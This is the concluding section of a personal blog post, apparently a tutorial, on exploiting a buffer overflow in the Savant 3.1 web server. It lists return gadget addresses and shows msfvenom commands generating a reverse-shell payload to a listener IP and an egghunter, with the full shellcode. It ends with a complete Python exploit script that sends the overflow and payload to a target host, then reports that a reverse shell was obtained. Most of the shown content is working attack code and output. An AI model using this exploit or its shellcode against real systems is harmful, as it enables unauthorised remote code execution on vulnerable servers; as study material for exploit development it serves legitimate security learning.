0x004175e8 : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x004175ee : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x004181b5 : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x004181c7 : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x004189dd : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x0041b44c : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x0041bc81 : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x0041c9fd : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x00421144 : pop edi # retn | startnull,ascii {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
0x0042119c : pop edi # retn | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.1 (C:\VulnerableSoftware\Savant\Savant.exe)
</pre></table></code></div></div><p>We can choose the last one <code class="language-plaintext highlighter-rouge">0x0042119c</code>. Address has a null byte so we cannot use it in payload as such, but since there are nullbytes in front of EIP location we can perform three byte overwrite by sending only three bytes and shortening payload length. By doing that null byte will be automatically “added” to address on the stack.</p><p>When we generate reverse shell payload, it takes more than 270 bytes we have at our disposal so we cannot place it in payload. What we can do is to generate egghunter and place reverse shell code somewhere else in a memory. We can add it after last header to act as POST request payload. We will tag shellcode with two instances of egg (w00t) and let egghunter search for it. Once egghunter finds two eggs, it redirect execution of a program to shellcode which is located after the second egg.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>msfvenom -p windows/shell_reverse_tcp LHOST=172.16.24.204 LPORT=4444 -f python -a x86 -b "\x00\x0a\x3f"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1712 bytes
buf =  b""
buf += b"\xda\xc4\xb8\x8b\xf1\x1b\x53\xd9\x74\x24\xf4\x5e\x29"
buf += b"\xc9\xb1\x52\x31\x46\x17\x03\x46\x17\x83\x4d\xf5\xf9"
buf += b"\xa6\xad\x1e\x7f\x48\x4d\xdf\xe0\xc0\xa8\xee\x20\xb6"
buf += b"\xb9\x41\x91\xbc\xef\x6d\x5a\x90\x1b\xe5\x2e\x3d\x2c"
buf += b"\x4e\x84\x1b\x03\x4f\xb5\x58\x02\xd3\xc4\x8c\xe4\xea"
buf += b"\x06\xc1\xe5\x2b\x7a\x28\xb7\xe4\xf0\x9f\x27\x80\x4d"
buf += b"\x1c\xcc\xda\x40\x24\x31\xaa\x63\x05\xe4\xa0\x3d\x85"
buf += b"\x07\x64\x36\x8c\x1f\x69\x73\x46\x94\x59\x0f\x59\x7c"
buf += b"\x90\xf0\xf6\x41\x1c\x03\x06\x86\x9b\xfc\x7d\xfe\xdf"
buf += b"\x81\x85\xc5\xa2\x5d\x03\xdd\x05\x15\xb3\x39\xb7\xfa"
buf += b"\x22\xca\xbb\xb7\x21\x94\xdf\x46\xe5\xaf\xe4\xc3\x08"
buf += b"\x7f\x6d\x97\x2e\x5b\x35\x43\x4e\xfa\x93\x22\x6f\x1c"
buf += b"\x7c\x9a\xd5\x57\x91\xcf\x67\x3a\xfe\x3c\x4a\xc4\xfe"
buf += b"\x2a\xdd\xb7\xcc\xf5\x75\x5f\x7d\x7d\x50\x98\x82\x54"
buf += b"\x24\x36\x7d\x57\x55\x1f\xba\x03\x05\x37\x6b\x2c\xce"
buf += b"\xc7\x94\xf9\x41\x97\x3a\x52\x22\x47\xfb\x02\xca\x8d"
buf += b"\xf4\x7d\xea\xae\xde\x15\x81\x55\x89\xb5\x46\x4d\x85"
buf += b"\xae\x64\x6d\x04\x73\xe0\x8b\x4c\x9b\xa4\x04\xf9\x02"
buf += b"\xed\xde\x98\xcb\x3b\x9b\x9b\x40\xc8\x5c\x55\xa1\xa5"
buf += b"\x4e\x02\x41\xf0\x2c\x85\x5e\x2e\x58\x49\xcc\xb5\x98"
buf += b"\x04\xed\x61\xcf\x41\xc3\x7b\x85\x7f\x7a\xd2\xbb\x7d"
buf += b"\x1a\x1d\x7f\x5a\xdf\xa0\x7e\x2f\x5b\x87\x90\xe9\x64"
buf += b"\x83\xc4\xa5\x32\x5d\xb2\x03\xed\x2f\x6c\xda\x42\xe6"
buf += b"\xf8\x9b\xa8\x39\x7e\xa4\xe4\xcf\x9e\x15\x51\x96\xa1"
buf += b"\x9a\x35\x1e\xda\xc6\xa5\xe1\x31\x43\xd5\xab\x1b\xe2"
buf += b"\x7e\x72\xce\xb6\xe2\x85\x25\xf4\x1a\x06\xcf\x85\xd8"
buf += b"\x16\xba\x80\xa5\x90\x57\xf9\xb6\x74\x57\xae\xb7\x5c"
</pre></table></code></div></div><p>Generating egghunter:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>/usr/bin/msf-egghunter -b "\x00\x0a\x3f" -a x86 -p windows -e "w00t" -f python
buf =  b""
buf += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
buf += b"\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75"
buf += b"\xea\xaf\x75\xe7\xff\xe7"
</pre></table></code></div></div><h2 id="final-exploit">Final exploit</h2><p>When we put it all together exploit code is following:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
</pre><td class="rouge-code"><pre>#!/usr/bin/python                                                                                                                                

import socket
import time

host = "172.16.24.213"
port = 80

jump ="\xb0\x02\x3c\x01\x7f\x16"  # opcode for jumping 26 bytes
eip = "\x9c\x11\x42"              # three byte overwrite

# Egghunter
egghunter =  b""
egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
egghunter += b"\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75"
egghunter += b"\xea\xaf\x75\xe7\xff\xe7"

# Reverse shellcode
buf =  b""
buf += b"\xda\xc4\xb8\x8b\xf1\x1b\x53\xd9\x74\x24\xf4\x5e\x29"
buf += b"\xc9\xb1\x52\x31\x46\x17\x03\x46\x17\x83\x4d\xf5\xf9"
buf += b"\xa6\xad\x1e\x7f\x48\x4d\xdf\xe0\xc0\xa8\xee\x20\xb6"
buf += b"\xb9\x41\x91\xbc\xef\x6d\x5a\x90\x1b\xe5\x2e\x3d\x2c"
buf += b"\x4e\x84\x1b\x03\x4f\xb5\x58\x02\xd3\xc4\x8c\xe4\xea"
buf += b"\x06\xc1\xe5\x2b\x7a\x28\xb7\xe4\xf0\x9f\x27\x80\x4d"
buf += b"\x1c\xcc\xda\x40\x24\x31\xaa\x63\x05\xe4\xa0\x3d\x85"
buf += b"\x07\x64\x36\x8c\x1f\x69\x73\x46\x94\x59\x0f\x59\x7c"
buf += b"\x90\xf0\xf6\x41\x1c\x03\x06\x86\x9b\xfc\x7d\xfe\xdf"
buf += b"\x81\x85\xc5\xa2\x5d\x03\xdd\x05\x15\xb3\x39\xb7\xfa"
buf += b"\x22\xca\xbb\xb7\x21\x94\xdf\x46\xe5\xaf\xe4\xc3\x08"
buf += b"\x7f\x6d\x97\x2e\x5b\x35\x43\x4e\xfa\x93\x22\x6f\x1c"
buf += b"\x7c\x9a\xd5\x57\x91\xcf\x67\x3a\xfe\x3c\x4a\xc4\xfe"
buf += b"\x2a\xdd\xb7\xcc\xf5\x75\x5f\x7d\x7d\x50\x98\x82\x54"
buf += b"\x24\x36\x7d\x57\x55\x1f\xba\x03\x05\x37\x6b\x2c\xce"
buf += b"\xc7\x94\xf9\x41\x97\x3a\x52\x22\x47\xfb\x02\xca\x8d"
buf += b"\xf4\x7d\xea\xae\xde\x15\x81\x55\x89\xb5\x46\x4d\x85"
buf += b"\xae\x64\x6d\x04\x73\xe0\x8b\x4c\x9b\xa4\x04\xf9\x02"
buf += b"\xed\xde\x98\xcb\x3b\x9b\x9b\x40\xc8\x5c\x55\xa1\xa5"
buf += b"\x4e\x02\x41\xf0\x2c\x85\x5e\x2e\x58\x49\xcc\xb5\x98"
buf += b"\x04\xed\x61\xcf\x41\xc3\x7b\x85\x7f\x7a\xd2\xbb\x7d"
buf += b"\x1a\x1d\x7f\x5a\xdf\xa0\x7e\x2f\x5b\x87\x90\xe9\x64"
buf += b"\x83\xc4\xa5\x32\x5d\xb2\x03\xed\x2f\x6c\xda\x42\xe6"
buf += b"\xf8\x9b\xa8\x39\x7e\xa4\xe4\xcf\x9e\x15\x51\x96\xa1"
buf += b"\x9a\x35\x1e\xda\xc6\xa5\xe1\x31\x43\xd5\xab\x1b\xe2"
buf += b"\x7e\x72\xce\xb6\xe2\x85\x25\xf4\x1a\x06\xcf\x85\xd8"
buf += b"\x16\xba\x80\xa5\x90\x57\xf9\xb6\x74\x57\xae\xb7\x5c"

buffer = jump + " /%" + "\x43" * 10 + egghunter + "\x43" * (276 - 10 - len(jump) - len(eip) - 1 - len(egghunter)) + eip + " HTTP/1.1\r\n"
buffer += "Connection: close\r\n\r\n" + "w00tw00t"  + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
s.close()

print ("[+] Payload sent")
</pre></table></code></div></div><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/savant_12.png?raw=true" alt="Fuzzing results" /></p><p>And it works! Reverse shell is established.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/blogging/'>Blogging</a>, <a href='/categories/tutorial/'>Tutorial</a>, <a href='/categories/exploit/'>Exploit</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/fuzzing/" class="post-tag no-text-decoration" >fuzzing</a> <a href="/tags/shellcoding/" class="post-tag no-text-decoration" >shellcoding</a> <a href="/tags/exploit/" class="post-tag no-text-decoration" >exploit</a> <a href="/tags/bufferoverflow/" class="post-tag no-text-decoration" >bufferoverflow</a> <a href="/tags/bof/" class="post-tag no-text-decoration" >bof</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Savant 3.1 webserver buffer overflow exploit - Stipe Marinovic&url=https://smarinovic.github.io/posts/Savant-web-server-BoF/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Savant 3.1 webserver buffer overflow exploit - Stipe Marinovic&u=https://smarinovic.github.io/posts/Savant-web-server-BoF/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Savant 3.1 webserver buffer overflow exploit - Stipe Marinovic&url=https://smarinovic.github.io/posts/Savant-web-server-BoF/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/shellcoding/">shellcoding</a> <a class="post-tag" href="/tags/slae/">slae</a> <a class="post-tag" href="/tags/fuzzing/">fuzzing</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/bufferoverflow/">bufferoverflow</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/encoder/">encoder</a> <a class="post-tag" href="/tags/egghunter/">egghunter</a> <a class="post-tag" href="/tags/decoder/">decoder</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/MinaliC-webserver-BoF/" class="btn btn-outline-primary"><p>MinaliC 2.0.0 buffer overflow exploit</p></a> <span class="btn btn-outline-primary disabled"><p>-</p></span></div><!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/MiniShare-webserver-BoF/"><div class="card-body"> <span class="timeago small"> Jul 12, 2020 <i class="unloaded">2020-07-12T17:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>MiniShare 1.4.1 webserver buffer overflow exploit</h3><div class="text-muted small"><p>Introduction MiniShare is a minimal web server with a simple GUI meant for fast and simple file sharing. It was released back in a days of Windows XP. Application has a buffer overflow vulnerabili...</p></div></div></a></div><div class="card"> <a href="/posts/MinaliC-webserver-BoF/"><div class="card-body"> <span class="timeago small"> Jul 13, 2020 <i class="unloaded">2020-07-13T17:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>MinaliC 2.0.0 buffer overflow exploit</h3><div class="text-muted small"><p>Introduction In this blog post we will go thru recreating buffer overflow exploit for MinaliC webserver. Application can be downloaded on following URL: https://sourceforge.net/projects/minalic/. ...</p></div></div></a></div><div class="card"> <a href="/posts/Bind-shell/"><div class="card-body"> <span class="timeago small"> May 23, 2020 <i class="unloaded">2020-05-23T01:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Linux bind shell in assembly</h3><div class="text-muted small"><p>Introduction Objective of this blog post is to explain process of creating bind shell in assembly language for 32 bit Linux. Blog post was created for the SLAE certification exam and it describes...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const observer = lozad(); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://twitter.com/stipemarinovic">Stipe Marinovic</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> with theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy/">Chirpy</a>.</p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted">Trending Tags</h4><!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/shellcoding/">shellcoding</a> <a class="post-tag" href="/tags/slae/">slae</a> <a class="post-tag" href="/tags/fuzzing/">fuzzing</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/bufferoverflow/">bufferoverflow</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/encoder/">encoder</a> <a class="post-tag" href="/tags/egghunter/">egghunter</a> <a class="post-tag" href="/tags/decoder/">decoder</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-11473652-4', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://smarinovic.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
